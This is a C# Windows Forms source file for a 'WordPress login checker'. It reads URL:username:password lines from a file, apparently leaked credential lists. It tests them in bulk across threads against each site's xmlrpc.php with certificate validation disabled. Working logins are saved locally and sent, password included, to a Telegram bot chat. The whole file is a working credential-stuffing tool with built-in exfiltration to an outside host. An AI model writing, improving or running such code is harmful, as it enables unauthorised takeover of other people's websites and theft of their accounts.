using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace WordPressLoginChecker
{
    public partial class Form1 : Form
    {
        private static readonly HttpClient client;
        private CancellationTokenSource cts;

        static Form1()
        {
            HttpClientHandler handler = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true
            };

            client = new HttpClient(handler)
            {
                Timeout = TimeSpan.FromSeconds(30) // Set timeout for HTTP requests
            };
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*"
            };

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtFilePath.Text = openFileDialog.FileName;
            }
        }

        private async void btnCheckLogins_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtFilePath.Text))
            {
                MessageBox.Show("Please select a file first.");
                return;
            }

            if (string.IsNullOrEmpty(txtSaveLocation.Text) || string.IsNullOrEmpty(txtOutputFileName.Text))
            {
                MessageBox.Show("Please select the save location and specify the output file name.");
                return;
            }

            if (numericUpDownThreads.Value < 1)
            {
                MessageBox.Show("Please specify at least 1 thread.");
                return;
            }

            cts = new CancellationTokenSource();
            string[] lines = File.ReadAllLines(txtFilePath.Text);
            int numberOfThreads = (int)numericUpDownThreads.Value;

            List<Task> tasks = new List<Task>();
            int chunkSize = lines.Length / numberOfThreads;

            for (int i = 0; i < numberOfThreads; i++)
            {
                int start = i * chunkSize;
                int end = (i == numberOfThreads - 1) ? lines.Length : start + chunkSize;
                string[] chunk = lines.Skip(start).Take(end - start).ToArray();

                tasks.Add(Task.Run(() => ProcessChunk(chunk, cts.Token)));
            }

            try
            {
                await Task.WhenAll(tasks);
            }
            catch (OperationCanceledException)
            {
                AppendOutput("Operation was canceled.", true);
            }
            finally
            {
                if (cts.IsCancellationRequested)
                {
                    AppendOutput("Processing was stopped by the user.", true);
                }
                else
                {
                    AppendOutput("Processing completed successfully.", false);
                }
            }
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            cts?.Cancel();
        }

        private void btnBrowseSaveLocation_Click(object sender, EventArgs e)
        {
            using (FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog())
            {
                if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
                {
                    txtSaveLocation.Text = folderBrowserDialog.SelectedPath;
                }
            }
        }

        private async Task ProcessChunk(string[] lines, CancellationToken token)
        {
            foreach (string line in lines)
            {
                if (token.IsCancellationRequested)
                    break;

                var match = Regex.Match(line, @"(https?:\/\/[^\s/]+\/(wp-login\.php|wp-admin))\b:([^:]+):([^:]+)");
                if (match.Success)
                {
                    string url = match.Groups[1].Value;
                    string username = match.Groups[3].Value;
                    string password = match.Groups[4].Value;

                    var status = await CheckLogin(url, username, password, token);
                    AppendOutput($"{url} - {status}", status != "success");
                }
            }
        }

        private async Task<string> CheckLogin(string url, string username, string password, CancellationToken token)
        {
            string xmlRpcUrl = Regex.Replace(url, "(wp-login\\.php|wp-admin)$", "xmlrpc.php");
            string xmlRequest = $@"
    <?xml version=""1.0""?>
    <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
            <param><value><string>{username}</string></value></param>
            <param><value><string>{password}</string></value></param>
        </params>
    </methodCall>";

            var content = new StringContent(xmlRequest, Encoding.UTF8, "text/xml");

            try
            {
                HttpResponseMessage response = await client.PostAsync(xmlRpcUrl, content, token);
                string responseContent = await response.Content.ReadAsStringAsync();

                if (!responseContent.Trim().StartsWith("<?xml"))
                {
                    AppendOutput($"Invalid XML response from {url}", true);
                    return "invalid_xml_response";
                }

                XDocument xmlResponse = XDocument.Parse(responseContent);

                if (xmlResponse.Descendants("fault").Any())
                {
                    return "failed";
                }
                else
                {
                    SaveSuccessfulLogin(url, username, password);

                    // Send success message to Telegram
                    string message = $"🟢 *Success* Wordpress Valid \n`URL:` {url}\n`Username:` {username}\n`Password:` {password}";
                    await SendToTelegram(message);

                    return "success";
                }
            }
            catch (TaskCanceledException ex) when (token.IsCancellationRequested)
            {
                AppendOutput($"Operation was canceled for {url}.", true);
                return "canceled";
            }
            catch (TaskCanceledException)
            {
                AppendOutput($"Timeout occurred while checking {url}.", true);
                return "timeout";
            }
            catch (HttpRequestException ex) when (
                ex.Message.Contains("403") ||
                ex.Message.Contains("Forbidden"))
            {
                AppendOutput($"Access denied (403) for {url}", true);
                return "access_denied";
            }
            catch (HttpRequestException ex) when (
                ex.InnerException is System.Net.Sockets.SocketException ||
                ex.Message.Contains("Connection reset") ||
                ex.Message.Contains("Could not resolve"))
            {
                AppendOutput($"Network or SSL error for {url}: {ex.Message}", true);
                return "network_error";
            }
            catch (Exception ex)
            {
                AppendOutput($"Unexpected error for {url}: {ex.Message}", true);
                return "unexpected_error";
            }
        }


        private async Task SendToTelegram(string message)
        {
            string botToken = telegramBotToken.Text;  // Bot token from UI
            string chatID = telegramChatID.Text;      // Chat ID from UI
            string telegramApiUrl = $"https://api.telegram.org/bot{botToken}/sendMessage";

            var payload = new Dictionary<string, string>
    {
        { "chat_id", chatID },
        { "text", message },
        { "parse_mode", "Markdown" }  // Enable Markdown formatting
    };

            var content = new FormUrlEncodedContent(payload);

            try
            {
                HttpResponseMessage response = await client.PostAsync(telegramApiUrl, content);
                if (!response.IsSuccessStatusCode)
                {
                    AppendOutput($"Failed to send message to Telegram: {response.ReasonPhrase}", true);
                }
            }
            catch (Exception ex)
            {
                AppendOutput($"Error sending message to Telegram: {ex.Message}", true);
            }
        }
        private void SaveSuccessfulLogin(string url, string username, string password)
        {
            string successFilePath = Path.Combine(txtSaveLocation.Text, txtOutputFileName.Text);
            string successEntry = $"{url}:{username}:{password}\n";
            File.AppendAllText(successFilePath, successEntry);
        }

        private void AppendOutput(string text, bool isError)
        {
            if (isError)
            {
                txtOutput.Invoke((Action)(() => txtOutput.SelectionColor = System.Drawing.Color.Red));
            }
            else
            {
                txtOutput.Invoke((Action)(() => txtOutput.SelectionColor = System.Drawing.Color.LightGreen));
            }

            txtOutput.Invoke((Action)(() =>
            {
                txtOutput.AppendText(text + Environment.NewLine);
                txtOutput.SelectionColor = System.Drawing.Color.Black;

                txtOutput.SelectionStart = txtOutput.Text.Length;
                txtOutput.ScrollToCaret();
            }));
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {
            // No implementation needed
        }

        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
